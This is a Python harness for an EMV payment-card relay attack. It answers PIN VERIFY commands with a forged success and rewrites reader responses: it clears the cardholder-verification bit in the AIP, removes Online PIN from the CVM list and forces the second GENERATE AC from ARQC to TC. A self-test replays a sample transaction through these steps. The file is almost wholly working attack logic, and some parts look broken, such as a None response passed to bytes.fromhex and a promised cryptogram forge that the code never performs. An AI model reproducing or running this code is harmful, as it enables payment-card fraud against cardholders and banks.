# -*- coding: utf-8 -*-
#!/usr/bin/env python3
"""Offline relay test harness - simulates reader and emulator locally."""

import logging
import sys
from typing import Optional, Tuple

# Reuse relay server logic
from protocol import CommandAPDU, ResponseAPDU, craft_verify_success
from relserver import (
    RelayServer, SessionState, is_verify_apdu,
    is_generate_ac, is_select, extract_aid_from_select,
    identify_brand_from_aid, is_ppse_or_pse,
    forge_2nd_gac, extract_arqc_from_rapdu,
    detect_gpo_template, cid_indicates_arqc,
    CID_TC, CID_ARQC, CID_AAC,
    SW_9000, SW_6F00,
)

log = logging.getLogger("FrankRelayOffline")
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

class FrankRelayOffline:
    """
    Offline relay that simulates a full EMV transaction with
    bypass, forge, and mutation features enabled.
    """

    def __init__(self):
        self.state = SessionState()
        self.reader_rapdu_log: list = []
        self.emulator_capdu_log: list = []

    def inject_capdu(self, capdu: bytes, source: str = "EMULATOR") -> Optional[bytes]:
        """Process a CAPDU as if it came from the emulator."""
        if source == "EMULATOR":
            self.emulator_capdu_log.append(capdu)

        # VERIFY BYPASS
        if source == "EMULATOR" and self.state.verify_bypass_enabled and is_verify_apdu(capdu):
            self.state.verify_bypass_count += 1
            pin_len = capdu[4] if len(capdu) > 4 else 0
            log.info(f"[VERIFY-BYPASS #{self.state.verify_bypass_count}] Lc={pin_len} -> 9000")
            fake_resp = craft_verify_success().to_bytes()
            return fake_resp

        # AID sniffer
        if source == "EMULATOR" and is_select(capdu):
            aid = extract_aid_from_select(capdu)
            if aid and not is_ppse_or_pse(aid):
                self.state.selected_aid = aid
                self.state.brand = identify_brand_from_aid(aid)
                log.info(f"AID: {aid.hex().upper()} -> {self.state.brand}")

        # Store pending CAPDU for RAPDU correlation
        if source == "EMULATOR":
            self.state.pending_capdu = capdu

        # Return None - the caller must supply the RAPDU via inject_rapdu
        return None

    def inject_rapdu(self, rapdu: bytes, source: str = "READER") -> Optional[bytes]:
        """Process a RAPDU as if it came from the reader."""
        if source == "READER":
            self.reader_rapdu_log.append(rapdu)

        # Observe reader RAPDU (GPO template, ARQC cache)
        self._observe_reader_rapdu(rapdu)

        # Mutations
        # AIP: clear CV bit
        if b"\x82\x02\x19\x80" in rapdu:
            rapdu = rapdu.replace(b"\x82\x02\x19\x80", b"\x82\x02\x18\x80")
            log.info("[AIP-MUTATE] CV bit cleared")

        # CVM: remove Online PIN
        if b"\x8E\x0E\x00\x00\x00\x00\x00\x00\x00\x00\x42\x03\x1E\x03\x1F\x03" in rapdu:
            old = b"\x8E\x0E\x00\x00\x00\x00\x00\x00\x00\x00\x42\x03\x1E\x03\x1F\x03"
            new = b"\x8E\x0E\x00\x00\x00\x00\x00\x00\x00\x00\x1F\x03\x1E\x03\x00\x00"
            rapdu = rapdu.replace(old, new)
            log.info("[CVM-MUTATE] Online PIN removed")

        # CID force on 2nd GAC
        if (b"\x9F\x27\x01\x80" in rapdu
                and self.state.second_ae_pending
                and self.state.pending_capdu
                and is_generate_ac(self.state.pending_capdu)):
            rapdu = rapdu.replace(b"\x9F\x27\x01\x80", b"\x9F\x27\x01\x40")
            log.info("[CID-FORCE] 2nd GAC: ARQC>TC")

        return rapdu

    def _observe_reader_rapdu(self, payload: bytes) -> None:
        pending = self.state.pending_capdu
        if not pending or len(pending) < 2:
            return

        ins = pending[1]  # APDU_INS

        if ins == 0xA8:  # GPO
            self.state.gpo_template = detect_gpo_template(payload)

        if ins == 0xAE:  # GENERATE AC
            cache = extract_arqc_from_rapdu(payload, self.state.gpo_template)
            if cache.template is None:
                cache.template = self.state.gpo_template
            is_arqc, reason = cid_indicates_arqc(cache, payload)
            self.state.arqc_cache = cache
            self.state.second_ae_pending = is_arqc
            self.state.second_ae_reason = reason

    def run_transaction(self, capdu_responses: list) -> list:
        """
        Run a full transaction with a list of (capdu_hex, rapdu_hex) pairs.
        Returns list of (sent_capdu, returned_rapdu_or_forged).
        """
        results = []
        for capdu_hex, rapdu_hex in capdu_responses:
            capdu = bytes.fromhex(capdu_hex)
            rapdu = bytes.fromhex(rapdu_hex)

            # Inject CAPDU
            forge_result = self.inject_capdu(capdu, "EMULATOR")
            if forge_result is not None:
                # VERIFY bypass or 2nd GAC forge
                results.append((capdu, forge_result))
                continue

            # Inject RAPDU
            modified = self.inject_rapdu(rapdu, "READER")
            results.append((capdu, modified if modified else rapdu))

        return results

def main() -> None:
    """Run a quick self-test."""
    relay = FrankRelayOffline()

    # Sample transaction: SELECT -> GPO -> READ RECORD -> VERIFY -> GAC
    tx = [
        ("00A4040007A000000003101000", "6F208407A0000000031010A510A50C9F080200029F090200029F1A020395"),
        ("80A8000023831F0102000000000000000000000000000000000000000000000000000000000000000000000000",
         "770A8202198080045A000000000000000000000000000000000000000000000000000000000000000000000000000000009000"),
        ("00B2010C00", "70815A0A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009000"),
        ("002000008008FFFFFFFFFFFFFFFF", None),  # VERIFY bypass -> 9000
        ("80AE00002300000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
         "770A9F2701809F360200019F260800000000000000009F1006010A03A00000"),
    ]

    results = relay.run_transaction(tx)
    for capdu, rapdu in results:
        print(f"CAPDU: {capdu.hex().upper()}")
        if rapdu:
            print(f"RAPDU: {rapdu.hex().upper()}")
        else:
            print("RAPDU: (none)")
        print()

    print(f"VERIFY bypass count: {relay.state.verify_bypass_count}")
    print(f"ARPC forge count:    {relay.state.arpc_forge_count}")
    print(f"2nd GAC pending:     {relay.state.second_ae_pending}")

if __name__ == "__main__":
    main()